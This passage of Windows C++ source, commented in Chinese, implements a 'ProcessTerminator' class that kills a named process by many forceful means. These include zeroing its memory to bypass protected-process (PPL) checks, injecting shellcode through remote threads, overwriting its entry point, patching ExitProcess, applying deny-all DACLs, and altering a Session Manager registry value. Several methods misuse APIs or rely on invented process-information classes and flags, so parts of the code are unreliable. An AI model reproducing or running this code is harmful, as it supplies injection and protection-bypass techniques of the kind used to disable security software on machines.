                    OBJECT_ATTRIBUTES objAttr2 = { 0 };
                    clientId2.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
                    objAttr2.Length = sizeof(OBJECT_ATTRIBUTES);

                    NTSTATUS stat = NtOpenProcess(&hProcess, accessMasks[amIdx], &objAttr2, &clientId2);
                    if (NT_SUCCESS(stat) && hProcess) {
                        if (amIdx == 0)
                            std::wcout << L"[直接内存清零]   NtOpenProcess成功（全权限）" << std::endl;
                        else if (amIdx == 1)
                            std::wcout << L"[直接内存清零]   NtOpenProcess成功（标准权限）" << std::endl;
                        else
                            std::wcout << L"[直接内存清零]   NtOpenProcess成功（最小权限）" << std::endl;
                        break;
                    }
                    if (hProcess) { NtClose(hProcess); hProcess = NULL; }
                }
            }

            if (hProcess) {
                MEMORY_BASIC_INFORMATION mbi;
                LPVOID address = 0;
                SIZE_T pageCount = 0, writablePages = 0, zeroedPages = 0;

                while (VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi))) {
                    pageCount++;
                    if (mbi.State != MEM_COMMIT) {
                        address = (LPBYTE)mbi.BaseAddress + mbi.RegionSize;
                        continue;
                    }

                    DWORD baseProt = mbi.Protect & 0xFF;
                    bool isWritable = (baseProt == PAGE_READWRITE) ||
                                      (baseProt == PAGE_WRITECOPY) ||
                                      (baseProt == PAGE_EXECUTE_READWRITE) ||
                                      (baseProt == PAGE_EXECUTE_WRITECOPY);
                    bool isReadOnly = (baseProt == PAGE_READONLY) ||
                                      (baseProt == PAGE_EXECUTE_READ);

                    // 检查 PAGE_GUARD 修饰符
                    bool hasGuard = (mbi.Protect & PAGE_GUARD) != 0;

                    if (isWritable || isReadOnly || hasGuard) {
                        writablePages++;
                        bool pageZeroed = false;

                        // 步骤0: 对只读/保护页改权限
                        if (isReadOnly || hasGuard) {
                            DWORD newP = isReadOnly ? PAGE_READWRITE :
                                       (baseProt == PAGE_EXECUTE_READ) ? PAGE_EXECUTE_READWRITE :
                                       baseProt;
                            DWORD oldP;
                            VirtualProtectEx(hProcess, mbi.BaseAddress, mbi.RegionSize, newP, &oldP);
                        }

                        SIZE_T region = (std::min)((SIZE_T)mbi.RegionSize, (SIZE_T)(64 * 1024));
                        SIZE_T bytesWritten = 0;

                        // 步骤1: WriteProcessMemory
                        std::vector<BYTE> zeros(region, 0);
                        if (WriteProcessMemory(hProcess, mbi.BaseAddress, zeros.data(), region, &bytesWritten) && bytesWritten > 0) {
                            totalZeroed += bytesWritten;
                            pageZeroed = true;
                        }
                        // 步骤2: NtWriteVirtualMemory (内核路径更短, 有时PPL下也能成功)
                        else if (NtWriteVirtualMemory) {
                            bytesWritten = 0;
                            NTSTATUS ws = NtWriteVirtualMemory(hProcess, mbi.BaseAddress, zeros.data(), region, &bytesWritten);
                            if (NT_SUCCESS(ws) && bytesWritten > 0) {
                                totalZeroed += bytesWritten;
                                pageZeroed = true;
                            }
                        }
                        // 步骤3: NtAllocateVirtualMemory(MEM_RESET) — 绕过PPL写权限检查
                        if (!pageZeroed && NtAllocateVirtualMemory) {
                            LPVOID pAddr = mbi.BaseAddress;
                            SIZE_T rSize = region;
                            // MEM_RESET: 告诉内核丢弃该页内容→清零, 不需写权限
                            NTSTATUS rs = NtAllocateVirtualMemory(hProcess, &pAddr, 0, &rSize,
                                MEM_RESET, baseProt);
                            if (NT_SUCCESS(rs)) {
                                totalZeroed += region;
                                pageZeroed = true;
                            }
                        }
                        // 步骤4: MEM_DECOMMIT + MEM_COMMIT — 强制回收并重新分配
                        if (!pageZeroed && NtAllocateVirtualMemory) {
                            LPVOID pAddr = mbi.BaseAddress;
                            SIZE_T rSize = region;
                            NTSTATUS ds = NtAllocateVirtualMemory(hProcess, &pAddr, 0, &rSize,
                                MEM_DECOMMIT, PAGE_NOACCESS);
                            if (NT_SUCCESS(ds)) {
                                rSize = region;
                                NTSTATUS cs = NtAllocateVirtualMemory(hProcess, &pAddr, 0, &rSize,
                                    MEM_COMMIT, PAGE_READWRITE);
                                if (NT_SUCCESS(cs)) {
                                    totalZeroed += region;
                                    pageZeroed = true;
                                }
                            }
                        }

                        if (pageZeroed) {
                            zeroedPages++;
                            memoryZeroed = true;
                        }
                    }

                    address = (LPBYTE)mbi.BaseAddress + mbi.RegionSize;
                }

                if (totalZeroed > 0)
                    std::wcout << L"[直接内存清零]   已清零 " << totalZeroed << L" 字节" << std::endl;
                CloseHandle(hProcess);
                hProcess = NULL;
            }

            if (!memoryZeroed) {
                std::wcout << L"[直接内存清零]   标准方法失败，尝试备用技术..." << std::endl;

                // 重新获取句柄用于备用路径
                HANDLE hBackup = NULL;
                if (NtOpenProcess) {
                    CLIENT_ID cidB = { 0 }; OBJECT_ATTRIBUTES oaB = { 0 };
                    cidB.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
                    oaB.Length = sizeof(OBJECT_ATTRIBUTES);
                    NtOpenProcess(&hBackup, PROCESS_ALL_ACCESS, &oaB, &cidB);
                }

                if (NtGetNextProcess && hBackup) {
                    HANDLE hDupProcess = NULL;
                    NTSTATUS status = NtGetNextProcess(hBackup, PROCESS_ALL_ACCESS, 0, 0, &hDupProcess);
                    if (NT_SUCCESS(status) && hDupProcess) {
                        MEMORY_BASIC_INFORMATION mbi;
                        LPVOID address = 0;

                        while (VirtualQueryEx(hDupProcess, address, &mbi, sizeof(mbi))) {
                            if (mbi.State == MEM_COMMIT) {
                                std::vector<BYTE> zeros(mbi.RegionSize, 0);
                                SIZE_T bytesWritten = 0;
                                WriteProcessMemory(hDupProcess, mbi.BaseAddress, zeros.data(), mbi.RegionSize, &bytesWritten);
                            }
                            address = (LPBYTE)mbi.BaseAddress + mbi.RegionSize;
                        }
                        CloseHandle(hDupProcess);
                    }
                    CloseHandle(hBackup);
                }
                if (hBackup) CloseHandle(hBackup);
            }

            if (NtTerminateProcess) {
                if (NtOpenProcess) {
                    CLIENT_ID clientId = { 0 };
                    OBJECT_ATTRIBUTES objAttr = { 0 };
                    clientId.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
                    objAttr.Length = sizeof(OBJECT_ATTRIBUTES);

                    HANDLE hTerminateProcess = NULL;
                    NTSTATUS status = NtOpenProcess(&hTerminateProcess, PROCESS_TERMINATE, &objAttr, &clientId);
                    if (NT_SUCCESS(status) && hTerminateProcess) {
                        NTSTATUS terminateStatus = NtTerminateProcess(hTerminateProcess, 1);
                        if (NT_SUCCESS(terminateStatus)) {
                            std::wcout << L"[直接内存清零]   NtTerminateProcess成功" << std::endl;
                            CloseHandle(hTerminateProcess);
                            continue;
                        }
                        CloseHandle(hTerminateProcess);
                    }
                }
            }

            // 最后兜底: 重新打开句柄用于 TerminateProcess
            {
                HANDLE hTerm = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
                if (hTerm) {
                    if (TerminateProcess(hTerm, 1))
                        std::wcout << L"[直接内存清零]   TerminateProcess成功" << std::endl;
                    else
                        std::wcerr << L"[直接内存清零]   所有方法失败" << std::endl;
                    CloseHandle(hTerm);
                } else {
                    std::wcerr << L"[直接内存清零]   所有方法失败 (无法打开终止句柄)" << std::endl;
                }
            }
        }

        return !isProcessRunning(processName);
    }
    catch (...) {
        return false;
    }
#else
    return false;
#endif
}

bool ProcessTerminator::terminateByProcessInjection(const std::string& processName) {
    try {
        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

#ifdef _WIN32
        for (int pid : pids) {
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
            if (hProcess) {
                // 分配内存
                LPVOID pRemoteCode = VirtualAllocEx(hProcess, NULL, 1024, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                if (pRemoteCode) {
                    // 写入退出代码
                    BYTE exitCode[] = { 0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3 }; // mov eax, 1; ret
                    WriteProcessMemory(hProcess, pRemoteCode, exitCode, sizeof(exitCode), NULL);

                    // 创建远程线程
                    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
                    if (hThread) {
                        WaitForSingleObject(hThread, INFINITE);
                        CloseHandle(hThread);
                    }

                    VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
                }
                CloseHandle(hProcess);
            }
        }
#endif

        return !pids.empty();
    }
    catch (...) {
        return false;
    }
}

bool ProcessTerminator::terminateByDebugging(const std::string& processName) {
    try {
        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

#ifdef _WIN32
        for (int pid : pids) {
            if (DebugActiveProcess(pid)) {
                DebugActiveProcessStop(pid);
                return true;
            }
        }
#endif
        return false;
    }
    catch (...) {
        return false;
    }
}

bool ProcessTerminator::terminateByTimedKill(const std::string& processName) {
    try {
        // 等待一段时间后终止进程
        std::this_thread::sleep_for(std::chrono::milliseconds(200));
        return terminateByProcessName(processName);
    }
    catch (...) {
        return false;
    }
}

bool ProcessTerminator::terminateByPriorityManipulation(const std::string& processName) {
    try {
        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

#ifdef _WIN32
        for (int pid : pids) {
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
            if (hProcess) {
                SetPriorityClass(hProcess, IDLE_PRIORITY_CLASS);
                bool result = TerminateProcess(hProcess, 0);
                CloseHandle(hProcess);
                if (result) return true;
            }
        }
#endif
        return false;
    }
    catch (...) {
        return false;
    }
}

bool ProcessTerminator::terminateByProcessHollowing(const std::string& processName) {
    try {
        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

#ifdef _WIN32
        for (int pid : pids) {
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
            if (hProcess) {
                // 挂起进程
                SuspendThread(hProcess);

                // 获取进程上下文
                CONTEXT context;
                context.ContextFlags = CONTEXT_FULL;
                GetThreadContext(hProcess, &context);

                // 读取PEB获取映像基址
                PROCESS_BASIC_INFORMATION pbi;
                ULONG returnLength;
                NtQueryInformationProcess(hProcess, static_cast<PROCESS_INFORMATION_CLASS>(ProcessBasicInformation), &pbi, sizeof(pbi), &returnLength);

                // 读取原始入口点
                PVOID imageBase;
                ReadProcessMemory(hProcess, (PCHAR)pbi.PebBaseAddress + 8, &imageBase, sizeof(PVOID), NULL);

                // 写入退出代码到入口点
                BYTE exitCode[] = { 0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3 }; // mov eax, 1; ret
                WriteProcessMemory(hProcess, imageBase, exitCode, sizeof(exitCode), NULL);

                // 恢复进程执行
                ResumeThread(hProcess);
                CloseHandle(hProcess);

                return true;
            }
        }
#endif
        return false;
    }
    catch (...) {
        return false;
    }
}

// 未公开API方法实现
bool ProcessTerminator::terminateByNativeAPI(const std::string& processName) {
    try {
        if (!initNativeAPI()) return false;

        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

#ifdef _WIN32
        for (int pid : pids) {
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
            if (hProcess) {
                NTSTATUS status = NtTerminateProcess(hProcess, 0);
                CloseHandle(hProcess);
                if (NT_SUCCESS(status)) return true;
            }
        }
#endif
        return false;
    }
    catch (...) {
        return false;
    }
}

bool ProcessTerminator::terminateByHandleEnumeration(const std::string& processName) {
    try {
        if (!initNativeAPI()) return false;

        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

#ifdef _WIN32
        // 获取系统所有句柄信息
        ULONG bufferSize = 0x10000;
        PSYSTEM_HANDLE_INFORMATION_EX handleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)malloc(bufferSize);

        while (NtQuerySystemInformation(16, handleInfo, bufferSize, NULL) == STATUS_INFO_LENGTH_MISMATCH) {
            bufferSize *= 2;
            free(handleInfo);
            handleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)malloc(bufferSize);
        }

        // 查找目标进程的句柄
        for (ULONG i = 0; i < handleInfo->NumberOfHandles; i++) {
            SYSTEM_HANDLE handle = handleInfo->Information[i];

            // 检查是否是进程句柄
            if (handle.ObjectTypeNumber == 0x7) { // 进程对象类型
                for (int pid : pids) {
                    if (handle.ProcessId == pid) {
                        // 复制句柄并终止进程
                        HANDLE hDuplicate;
                        if (DuplicateHandle(GetCurrentProcess(), (HANDLE)handle.Handle,
                            GetCurrentProcess(), &hDuplicate,
                            PROCESS_TERMINATE, FALSE, 0)) {
                            TerminateProcess(hDuplicate, 0);
                            CloseHandle(hDuplicate);
                            free(handleInfo);
                            return true;
                        }
                    }
                }
            }
        }

        free(handleInfo);
#endif
        return false;
    }
    catch (...) {
        return false;
    }
}

bool ProcessTerminator::terminateByMemoryPatching(const std::string& processName) {
    try {
        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

#ifdef _WIN32
        for (int pid : pids) {
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
            if (hProcess) {
                // 查找进程中的关键函数并修改
                HMODULE hModules[1024];
                DWORD cbNeeded;

                if (EnumProcessModules(hProcess, hModules, sizeof(hModules), &cbNeeded)) {
                    for (DWORD i = 0; i < cbNeeded / sizeof(HMODULE); i++) {
                        TCHAR szModuleName[MAX_PATH];
                        if (GetModuleFileNameEx(hProcess, hModules[i], szModuleName, sizeof(szModuleName) / sizeof(TCHAR))) {
                            // 检查是否是关键模块
                            if (_tcsstr(szModuleName, L"kernel32.dll") || _tcsstr(szModuleName, L"ntdll.dll")) {
                                // 查找ExitProcess函数
                                FARPROC pExitProcess = GetProcAddress(hModules[i], "ExitProcess");
                                if (pExitProcess) {
                                    // 修改函数入口点
                                    BYTE patch[] = { 0xC3 }; // ret
                                    WriteProcessMemory(hProcess, pExitProcess, patch, sizeof(patch), NULL);

                                    // 创建远程线程调用ExitProcess
                                    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                        (LPTHREAD_START_ROUTINE)pExitProcess, NULL, 0, NULL);
                                    if (hThread) {
                                        WaitForSingleObject(hThread, INFINITE);
                                        CloseHandle(hThread);
                                        CloseHandle(hProcess);
                                        return true;
                                    }
                                }
                            }
                        }
                    }
                }
                CloseHandle(hProcess);
            }
        }
#endif
        return false;
    }
    catch (...) {
        return false;
    }
}

// OB回调方法实现
bool ProcessTerminator::terminateByObCallbacks(const std::string& processName) {
    try {
        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

#ifdef _WIN32
        // 这种方法通常需要内核模式驱动
        // 这里我们模拟通过修改注册表来影响对象管理器
        HKEY hKey;
        if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\Session Manager", 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
            // 设置一个可能影响对象管理器的值
            DWORD value = 1;
            RegSetValueEx(hKey, L"ProtectionMode", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
            RegCloseKey(hKey);

            // 然后尝试终止进程
            return terminateByProcessName(processName);
        }
#endif
        return false;
    }
    catch (...) {
        return false;
    }
}

bool ProcessTerminator::terminateByProcessObjectManipulation(const std::string& processName) {
    try {
        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

#ifdef _WIN32
        for (int pid : pids) {
            // 获取进程对象
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
            if (hProcess) {
                // 尝试修改进程对象的安全描述符
                PSECURITY_DESCRIPTOR pSD = NULL;
                PACL pDacl = NULL;

                if (GetSecurityInfo(hProcess, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, &pDacl, NULL, &pSD) == ERROR_SUCCESS) {
                    // 创建一个空的DACL（拒绝所有访问）
                    PACL pEmptyDacl = NULL;
                    EXPLICIT_ACCESS ea = { 0 };
                    ea.grfAccessPermissions = 0;
                    ea.grfAccessMode = DENY_ACCESS;
                    ea.grfInheritance = NO_INHERITANCE;
                    ea.Trustee.TrusteeForm = TRUSTEE_IS_NAME;
                    ea.Trustee.ptstrName = const_cast<LPTSTR>(L"EVERYONE");

                    SetEntriesInAcl(1, &ea, NULL, &pEmptyDacl);

                    // 应用新的DACL
                    SetSecurityInfo(hProcess, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pEmptyDacl, NULL);

                    LocalFree(pEmptyDacl);
                    LocalFree(pSD);
                }

                CloseHandle(hProcess);

                // 现在进程应该无法正常访问自身，尝试终止
                return terminateByPID(pid);
            }
        }
#endif
        return false;
    }
    catch (...) {
        return false;
    }
}

bool ProcessTerminator::terminateBySecurityDescriptorModification(const std::string& processName) {
    try {
        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

#ifdef _WIN32
        for (int pid : pids) {
            // 获取进程令牌
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_QUERY_INFORMATION);
            if (hProcess) {
                HANDLE hToken;
                if (OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hToken)) {
                    // 获取当前安全描述符
                    DWORD dwSizeNeeded = 0;
                    GetKernelObjectSecurity(hToken, DACL_SECURITY_INFORMATION, NULL, 0, &dwSizeNeeded);

                    if (dwSizeNeeded > 0) {
                        PSECURITY_DESCRIPTOR pSD = (PSECURITY_DESCRIPTOR)malloc(dwSizeNeeded);
                        if (GetKernelObjectSecurity(hToken, DACL_SECURITY_INFORMATION, pSD, dwSizeNeeded, &dwSizeNeeded)) {
                            // 修改安全描述符，移除所有权限
                            PACL pDacl = NULL;
                            BOOL bDaclPresent = FALSE;
                            BOOL bDaclDefaulted = FALSE;

                            if (GetSecurityDescriptorDacl(pSD, &bDaclPresent, &pDacl, &bDaclDefaulted) && bDaclPresent) {
                                // 创建一个空的DACL
                                PACL pEmptyDacl = NULL;
                                EXPLICIT_ACCESS ea = { 0 };
                                ea.grfAccessPermissions = 0;
                                ea.grfAccessMode = DENY_ACCESS;
                                ea.grfInheritance = NO_INHERITANCE;
                                ea.Trustee.TrusteeForm = TRUSTEE_IS_NAME;
                                ea.Trustee.ptstrName = const_cast<LPTSTR>(L"EVERYONE");

                                SetEntriesInAcl(1, &ea, NULL, &pEmptyDacl);

                                // 设置新的安全描述符
                                SECURITY_DESCRIPTOR sd;
                                InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
                                SetSecurityDescriptorDacl(&sd, TRUE, pEmptyDacl, FALSE);

                                SetKernelObjectSecurity(hToken, DACL_SECURITY_INFORMATION, &sd);

                                LocalFree(pEmptyDacl);
                            }
                        }
                        free(pSD);
                    }

                    CloseHandle(hToken);
                }
                CloseHandle(hProcess);

                // 现在进程应该无法正常操作，尝试终止
                return terminateByPID(pid);
            }
        }
#endif
        return false;
    }
    catch (...) {
        return false;
    }
}
// 方法1: 通过能源管理终止进程
bool ProcessTerminator::terminateByProcessEnergyManagement(const std::string& processName) {
#ifdef _WIN32
    try {
        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

        for (int pid : pids) {
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
            if (!hProcess || hProcess == INVALID_HANDLE_VALUE) continue;

            try {
                // [v5.3 跨版本兼容] 使用能源管理API限制进程能耗
                //   SetProcessInformation 是 Win8+ 函数, Win7 SDK 不声明
                //   用 GetProcAddress 动态加载, Win7 内核未导出则跳过
                static auto pSetProcessInformation =
                    reinterpret_cast<FnSetProcessInformation>(
                        GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "SetProcessInformation"));
                if (pSetProcessInformation) {
                    PROCESS_POWER_THROTTLING_STATE powerThrottling = { 0 };
                    powerThrottling.Version = PROCESS_POWER_THROTTLING_CURRENT_VERSION;
                    powerThrottling.ControlMask = PROCESS_POWER_THROTTLING_EXECUTION_SPEED;
                    powerThrottling.StateMask = PROCESS_POWER_THROTTLING_EXECUTION_SPEED;
                    pSetProcessInformation(hProcess, ProcessPowerThrottling,
                        &powerThrottling, sizeof(powerThrottling));
                }

                // 将进程优先级设置为最低
                SetPriorityClass(hProcess, IDLE_PRIORITY_CLASS);

                // 尝试终止进程
                TerminateProcess(hProcess, 0);
            }
            catch (...) {
                // 忽略内部异常
            }

            CloseHandle(hProcess);
        }
    }
    catch (...) {
        // 忽略异常
    }
#endif
    return false;
}

// 方法2: 通过进程状态扩展终止进程
bool ProcessTerminator::terminateByProcessStateExtension(const std::string& processName) {
#ifdef _WIN32
    try {
        if (!initNativeAPI()) return false;

        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

        for (int pid : pids) {
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
            if (!hProcess) continue;

            // 使用未公开的进程状态扩展API
            // 设置进程为"即将终止"状态
            ULONG processState = 1; // 表示进程即将终止
            NTSTATUS status = NtSetInformationProcess(
                hProcess,
                static_cast<PROCESS_INFORMATION_CLASS>(45), // ProcessStateInformation
                &processState,
                sizeof(processState)
            );

            if (NT_SUCCESS(status)) {
                // 尝试正常终止
                bool result = TerminateProcess(hProcess, 0);
                CloseHandle(hProcess);
                if (result) return true;
            }

            CloseHandle(hProcess);
        }
    }
    catch (...) {
        // 忽略异常
    }
#endif
    return false;
}

// 方法3: 通过进程容错机制终止进程
bool ProcessTerminator::terminateByProcessFaultTolerance(const std::string& processName) {
#ifdef _WIN32
    try {
        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

        for (int pid : pids) {
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
            if (!hProcess || hProcess == INVALID_HANDLE_VALUE) continue;

            // 禁用进程的容错机制
            ULONG faultTolerance = 0; // 禁用容错
            NTSTATUS status = NtSetInformationProcess(
                hProcess,
                static_cast<PROCESS_INFORMATION_CLASS>(52), // ProcessFaultToleranceInformation
                &faultTolerance,
                sizeof(faultTolerance)
            );

            if (NT_SUCCESS(status)) {
                // 注入一个会导致异常的指令
                LPVOID pRemoteCode = VirtualAllocEx(hProcess, NULL, 1024, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                if (pRemoteCode) {
                    // 写入会导致除零异常的指令
                    BYTE faultCode[] = {
                        0x33, 0xC0,    // xor eax, eax
                        0xF7, 0xF0,    // div eax (除零异常)
                        0xC3           // ret
                    };

                    WriteProcessMemory(hProcess, pRemoteCode, faultCode, sizeof(faultCode), NULL);

                    // 创建远程线程执行异常代码
                    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                        (LPTHREAD_START_ROUTINE)pRemoteCode,
                        NULL, 0, NULL);
                    if (hThread) {
                        WaitForSingleObject(hThread, 1000);
                        CloseHandle(hThread);
                    }

                    VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
                }

                // 尝试正常终止
                bool result = TerminateProcess(hProcess, 0);
                CloseHandle(hProcess);
                if (result) return true;
            }

            CloseHandle(hProcess);
        }
    }
    catch (...) {
        // 忽略异常
    }
#endif
    return false;
}

// 方法4: 通过进程活动调节终止进程
bool ProcessTerminator::terminateByProcessActivityModeration(const std::string& processName) {
#ifdef _WIN32
    try {
        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

        for (int pid : pids) {
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
            if (!hProcess || hProcess == INVALID_HANDLE_VALUE) continue;

            // [v5.3 跨版本兼容] 使用进程活动调节API限制进程活动
            //   SetProcessInformation 是 Win8+ 函数, 用 GetProcAddress 动态加载
            static auto pSetProcessInformation =
                reinterpret_cast<FnSetProcessInformation>(
                    GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "SetProcessInformation"));
            if (pSetProcessInformation) {
                PROCESS_ACTIVITY_MODERATION activityModeration = { 0 };
                activityModeration.Version = PROCESS_ACTIVITY_MODERATION_CURRENT_VERSION;
                activityModeration.Flags = PROCESS_ACTIVITY_MODERATION_ENABLE;
                activityModeration.ExemptionTimeMs = 0; // 无豁免时间

                if (pSetProcessInformation(hProcess, ProcessActivityModeration, &activityModeration, sizeof(activityModeration))) {
                    // 将进程活动限制到最低
                    activityModeration.ExemptionTimeMs = 1; // 最小豁免时间
                    pSetProcessInformation(hProcess, ProcessActivityModeration, &activityModeration, sizeof(activityModeration));

                    // 等待一段时间让进程因活动受限而停止响应
                    std::this_thread::sleep_for(std::chrono::milliseconds(500));

                    // 尝试终止进程
                    bool result = TerminateProcess(hProcess, 0);
                    CloseHandle(hProcess);
                    if (result) return true;
                }
            }

            CloseHandle(hProcess);
        }
    }
    catch (...) {
        // 忽略异常
    }
#endif
    return false;
}

// 方法5: 通过基于虚拟化的安全性终止进程
bool ProcessTerminator::terminateByProcessVirtualizationBasedSecurity(const std::string& processName) {
#ifdef _WIN32
    try {
        if (!initNativeAPI()) return false;

        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

        for (int pid : pids) {
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
            if (!hProcess || hProcess == INVALID_HANDLE_VALUE) continue;

            // 使用基于虚拟化的安全性API隔离进程
            PROCESS_VIRTUALIZATION_BASED_SECURITY vbsInfo = { 0 };
            vbsInfo.Flags = PROCESS_VIRTUALIZATION_BASED_SECURITY_ENABLE;

            NTSTATUS status = NtSetInformationProcess(
                hProcess,
                static_cast<PROCESS_INFORMATION_CLASS>(61), // ProcessVirtualizationBasedSecurity
                &vbsInfo,
                sizeof(vbsInfo)
            );

            if (NT_SUCCESS(status)) {
                // 将进程完全隔离
                vbsInfo.Flags |= PROCESS_VIRTUALIZATION_BASED_SECURITY_ISOLATION;
                NtSetInformationProcess(
                    hProcess,
                    static_cast<PROCESS_INFORMATION_CLASS>(61),
                    &vbsInfo,
                    sizeof(vbsInfo)
                );

                // 尝试终止被隔离的进程
                bool result = TerminateProcess(hProcess, 0);
                CloseHandle(hProcess);
                if (result) return true;
            }

            CloseHandle(hProcess);
        }
    }
    catch (...) {
        // 忽略异常
    }
#endif
    return false;
}
bool ProcessTerminator::terminateByTaskManagerMethod(const std::string& processName) {
#ifdef _WIN32
    try {
        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

        auto startTime = std::chrono::steady_clock::now();
        auto endTime = startTime + std::chrono::seconds(6);

        // 循环6秒尝试终止进程
        while (std::chrono::steady_clock::now() < endTime) {
            for (int pid : pids) {
                HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
                if (hProcess) {
                    // 尝试正常终止
                    if (TerminateProcess(hProcess, 0)) {
                        CloseHandle(hProcess);
                        std::wcout << L"成功终止进程: " << processName.c_str() << L" (PID: " << pid << L")" << std::endl;
                        return true;
                    }
                    CloseHandle(hProcess);
                }
            }

            // 检查进程是否还存在
            if (!isProcessRunning(processName)) {
                return true;
            }

            // 等待一小段时间再尝试
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }

        // 如果6秒后进程仍然存在，尝试强制终止
        for (int pid : pids) {
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
            if (hProcess) {
                // 使用更强制的方法
                StripProcessPrivileges(hProcess); // 剥夺权限

                // 再次尝试终止
                if (TerminateProcess(hProcess, 0)) {
                    CloseHandle(hProcess);
                    std::wcout << L"强制终止进程: " << processName.c_str() << L" (PID: " << pid << L")" << std::endl;
                    return true;
                }
                CloseHandle(hProcess);
            }
        }

        return !isProcessRunning(processName);
    }
    catch (...) {
        return false;
    }
#else
    return false;
#endif
}
// WMI方法实现
bool ProcessTerminator::terminateByWMI(const std::string& processName) {
#ifdef _WIN32
    try {
        HRESULT hres;

        // 初始化COM
        hres = CoInitializeEx(0, COINIT_MULTITHREADED);
        if (FAILED(hres)) return false;

        // 设置COM安全级别
        hres = CoInitializeSecurity(
            NULL,
            -1,
            NULL,
            NULL,
            RPC_C_AUTHN_LEVEL_NONE,
            RPC_C_IMP_LEVEL_IMPERSONATE,
            NULL,
            EOAC_NONE,
            NULL
        );

        // 创建WMI定位器
        IWbemLocator* pLoc = NULL;
        hres = CoCreateInstance(
            CLSID_WbemLocator,
            NULL,
            CLSCTX_INPROC_SERVER,
            IID_IWbemLocator,
            (LPVOID*)&pLoc
        );

        if (FAILED(hres)) {
            CoUninitialize();
            return false;
        }

        // 连接到WMI
        IWbemServices* pSvc = NULL;
        hres = pLoc->ConnectServer(
            _bstr_t(L"ROOT\\CIMV2"),
            NULL,
            NULL,
            NULL,
            NULL,
            NULL,
            NULL,
            &pSvc
        );

        if (FAILED(hres)) {
            pLoc->Release();
            CoUninitialize();
            return false;
        }

        // 设置代理安全级别
        hres = CoSetProxyBlanket(
            pSvc,
            RPC_C_AUTHN_WINNT,
            RPC_C_AUTHZ_NONE,
            NULL,
            RPC_C_AUTHN_LEVEL_CALL,
            RPC_C_IMP_LEVEL_IMPERSONATE,
            NULL,
            EOAC_NONE
        );

        if (FAILED(hres)) {
            pSvc->Release();
            pLoc->Release();
            CoUninitialize();
            return false;
        }

        // 执行WMI查询
        IEnumWbemClassObject* pEnumerator = NULL;

        // 将多字节字符串转换为宽字符字符串
        std::wstring wideProcessName = MultiByteToWide(processName);
        std::wstring query = L"SELECT * FROM Win32_Process WHERE Name = '" + wideProcessName + L"'";

        hres = pSvc->ExecQuery(
            bstr_t(L"WQL"),
            bstr_t(query.c_str()),
            WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
            NULL,
            &pEnumerator
        );

        if (FAILED(hres)) {
            pSvc->Release();
            pLoc->Release();
            CoUninitialize();
            return false;
        }

        // 遍历结果并终止进程
        IWbemClassObject* pclsObj = NULL;
        ULONG uReturn = 0;
        bool result = false;

        while (pEnumerator) {
